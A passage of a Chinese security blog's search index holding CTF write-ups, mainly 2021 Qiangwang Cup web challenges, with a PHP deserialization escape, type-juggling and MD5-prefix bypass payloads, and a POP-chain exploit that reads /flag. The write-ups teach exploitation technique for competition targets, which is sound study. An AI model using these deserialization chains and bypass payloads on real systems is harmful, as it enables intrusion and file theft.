class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>PS：有些小伙伴可能就会问了，用来逃逸的值或者键为啥要用’flagphp‘或者是6个’flag’呢？其实，用什么内容进行逃逸并不重要，重要的是逃逸的内容必须满足一定的长度才可以使得它逃逸之后的序列化字符串是正确的。比如6个’flag’就可以替换为8个’php’!</p><h3 id="忘记说了，源码提示在phpinfo-有提示d0g3-f1ag-php！"><a href="#忘记说了，源码提示在phpinfo-有提示d0g3-f1ag-php！" class="headerlink" title="忘记说了，源码提示在phpinfo()有提示d0g3_f1ag.php！"></a>忘记说了，源码提示在phpinfo()有提示d0g3_f1ag.php！</h3>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 强网杯</title>
      <link href="/post/2021-05/2021%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
      <url>/post/2021-05/2021%E5%BC%BA%E7%BD%91%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="强网先锋-寻宝"><a href="#强网先锋-寻宝" class="headerlink" title="[强网先锋]寻宝"></a>[强网先锋]寻宝</h2><p><strong>考点：1. php源码审计         2. 脚本的编写</strong></p><p>给了我们两个信息，分边对应2个KEY，得到2个KEY后就可以获得flag了</p><p>首先我们先看KEY1</p><h3 id="KEY1"><a href="#KEY1" class="headerlink" title="KEY1"></a>KEY1</h3><p>需要绕过5个if就可以获得flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filter_word </span>= <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;KeY1lhv&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;num&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>,<span class="string">&#x27;\,&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;0000000&#x27;</span>);</span><br><span class="line">        <span class="variable">$filter_phrase</span>= <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_word</span>).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="variable">$filter_phrase</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ppp</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$ppp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number1&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number2&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;nunber3&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number4&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number5&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//$num1 = $ppp[&#x27;number1&#x27;];</span></span><br><span class="line"><span class="variable">$num1 </span>= filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number1&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num2 </span>= filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number2&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num3 </span>= filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number3&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num4 </span>= filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number4&#x27;</span>]);</span><br><span class="line"><span class="variable">$num5 </span>= filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number5&#x27;</span>]);</span><br><span class="line">var_dump(<span class="variable">$ppp</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num1</span>) &amp;&amp; is_numeric(<span class="variable">$num1</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;非数字&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num1 </span>&gt; <span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;第一层&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num2</span>) &amp;&amp; strlen(<span class="variable">$num2</span>) &lt;= <span class="number">4</span> &amp;&amp; intval(<span class="variable">$num2 </span>+ <span class="number">1</span>) &gt; <span class="number">500000</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;第二层&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num3</span>) &amp;&amp; <span class="string">&#x27;4bf21cd&#x27;</span> === substr(md5(<span class="variable">$num3</span>),<span class="number">0</span>,<span class="number">7</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;第三层&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(!(<span class="variable">$num4 </span>&lt; <span class="number">0</span>)&amp;&amp;(<span class="variable">$num4 </span>== <span class="number">0</span>)&amp;&amp;(<span class="variable">$num4 </span>&lt;= <span class="number">0</span>)&amp;&amp;(strlen(<span class="variable">$num4</span>) &gt; <span class="number">6</span>)&amp;&amp;(strlen(<span class="variable">$num4</span>) &lt; <span class="number">8</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$num4</span>) )&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;第四层&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$num5</span>)||(strlen(<span class="variable">$num5</span>)==<span class="number">0</span>)) <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                    <span class="variable">$b</span>=json_decode(@<span class="variable">$num5</span>);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$y </span>= <span class="variable">$b </span>=== <span class="literal">NULL</span>)&#123;</span><br><span class="line">                                <span class="keyword">if</span>(<span class="variable">$y </span>=== <span class="literal">true</span>)&#123;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="string">&quot;第五层&quot;</span>;</span><br><span class="line">                                    <span class="keyword">include</span> <span class="string">&#x27;KeY1lhv.php&#x27;</span>;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="variable">$KEY1</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第2个和第4个用科学计数法就可以</p><p>第1个和第5个使用弱类型就可以</p><p>第3个md5碰撞脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0</span></span><br><span class="line">md5_value = <span class="string">&quot;4bf21cd&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    md5_val = hashlib.md5(<span class="built_in">str</span>(payload).encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="keyword">if</span> md5_val[:<span class="number">7</span>] == md5_value:</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">    payload += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload：</p><blockquote><p>ppp[number1]=1234a&amp;ppp[number2]=9e9&amp;ppp[number3]=61823470&amp;ppp[number4]=0e99999&amp;ppp[number5]=1a</p></blockquote><h3 id="KEY2"><a href="#KEY2" class="headerlink" title="KEY2"></a>KEY2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> docx</span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&#x27;D:/phpstudy_pro/WWW/five_month&#x27;</span>)</span><br><span class="line">dires = os.listdir()</span><br><span class="line"><span class="keyword">for</span> dirss <span class="keyword">in</span> dires:</span><br><span class="line">    os.chdir(<span class="string">f&#x27;D:/phpstudy_pro/WWW/five_month/<span class="subst">&#123;dirss&#125;</span>&#x27;</span>)</span><br><span class="line">    dirs = os.listdir()</span><br><span class="line">    <span class="keyword">for</span> di <span class="keyword">in</span> dirs:</span><br><span class="line">        os.chdir(<span class="string">f&#x27;D:/phpstudy_pro/WWW/five_month/<span class="subst">&#123;dirss&#125;</span>/<span class="subst">&#123;di&#125;</span>&#x27;</span>)</span><br><span class="line">        ds = os.listdir()</span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> ds:</span><br><span class="line">            doc = docx.Document(d)</span><br><span class="line">            <span class="keyword">for</span> do <span class="keyword">in</span> doc.paragraphs:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;KEY2&quot;</span> <span class="keyword">in</span> do.text:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;five_month/<span class="subst">&#123;dirss&#125;</span>/<span class="subst">&#123;di&#125;</span>/<span class="subst">&#123;d&#125;</span>&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(do.text)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog2/202112062019558.png" alt="image-20210615135023570"></p><p>PS:我写的这个脚本绕过.png图片，所以先用everything把图片提取出去在运行脚本就可以了，记得改路径！</p><h2 id="强网先锋-赌徒"><a href="#强网先锋-赌徒" class="headerlink" title="[强网先锋]赌徒"></a>[强网先锋]赌徒</h2><p><strong>考点： 构造pop链</strong></p><p>进去就一句话</p><blockquote><p>I think you need /etc/hint . Before this you need to see the source code</p></blockquote><p>看了看源码，看了看请求和响应，啥也没看出来</p><p>老规矩，上dirsearch</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog2/202112062019312.png" alt="image-20210614183247758"></p><p>一个<a href="http://www.zip的备份文件，下载下来后里面有一个index.php的源码文件，源码如下：">www.zip的备份文件，下载下来后里面有一个index.php的源码文件，源码如下：</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//hint is in hint.php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I think you need /etc/hint . Before this you need to see the source code&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sayhello();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span>.<span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="string">&#x27;ffiilleennaammee&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_hint</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$hint</span>=base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;Get_hint(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hi</span> = <span class="keyword">new</span>  Start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从代码中很容易的可以看出，给’hello’传参，然后进行序列化攻击。</p><p>现在问题来了，代码中一共有3个类，我们需要从哪一个类开始下手呢？</p><p>通过对魔法方法和序列化的的学习，我们只能从Start这个类开始下手，当对这个该类进行反序列化时，会自动执行wakeup()方法，而这3个类中只有Start类存在这个方法</p><p>再继续观察发现，我们最终需要达到的目的地是Room类的Get_hint()方法</p><p>构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Start();<span class="comment">// __wakeup()进入，</span></span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="keyword">new</span> Info();<span class="comment">// Info的__toString()进入</span></span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;file[<span class="string">&quot;filename&quot;</span>] = <span class="keyword">new</span> Room();<span class="comment">// Room的__get()进入</span></span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;file[<span class="string">&quot;filename&quot;</span>]-&gt;a= <span class="keyword">new</span> Room();<span class="comment">// Room的__invoke()进入</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112082108006.png" alt="image-20210614193035543"></p><blockquote><p><a href="http://eci-2zechgvn691am5t4itp6.cloudeci1.ichunqiu.com/?hello=O:5:&quot;Start&quot;:2:%7Bs:4:&quot;name&quot;;O:4:&quot;Info&quot;:3:%7Bs:17:&quot;%00Info%00phonenumber&quot;;i:123123;s:7:&quot;promise&quot;;s:15:&quot;I">http://eci-2zechgvn691am5t4itp6.cloudeci1.ichunqiu.com/?hello=O:5:&quot;Start&quot;:2:{s:4:&quot;name&quot;;O:4:&quot;Info&quot;:3:{s:17:&quot;%00Info%00phonenumber&quot;;i:123123;s:7:&quot;promise&quot;;s:15:&quot;I</a> will not !!!!”;s:4:”file”;a:1:{s:8:”filename”;O:4:”Room”:3:{s:8:”filename”;s:5:”/flag”;s:10:”sth_to_set”;N;s:1:”a”;O:4:”Room”:3:{s:8:”filename”;s:5:”/flag”;s:10:”sth_to_set”;N;s:1:”a”;s:0:””;}}}}s:4:”flag”;s:33:”syst3m(“cat 127.0.0.1/etc/hint”);”;}</p></blockquote><p>PS：利用了魔法方法的特性成功进行了序列化攻击，实现了在一个类跳转到另一个类并执行方法！</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog2/202112062019306.png" alt="QQ图片20210614194249"></p><p>base64解密得：</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog2/202112062019628.png" alt="image-20210614194412336"></p><blockquote><p>flag{668c5887-b4ae-4853-a3b4-e50e9c9e1b3e}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> Ctfer </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="/manifest.json"/>
      <url>/manifest.json</url>
      
        <content type="html"><![CDATA[{"name":"string","short_name":"Junzhou","theme_color":"#49b1f5","background_color":"#49b1f5","display":"standalone","scope":"/","start_url":"/","icons":[{"src":"images/pwaicons/36.png","sizes":"36x36","type":"image/png"},{"src":"images/pwaicons/48.png","sizes":"48x48","type":"image/png"},{"src":"images/pwaicons/72.png","sizes":"72x72","type":"image/png"},{"src":"images/pwaicons/96.png","sizes":"96x96","type":"image/png"},{"src":"images/pwaicons/144.png","sizes":"144x144","type":"image/png"},{"src":"images/pwaicons/192.png","sizes":"192x192","type":"image/png"},{"src":"images/pwaicons/512.png","sizes":"512x512","type":"image/png"}],"splash_pages":null}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>link</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
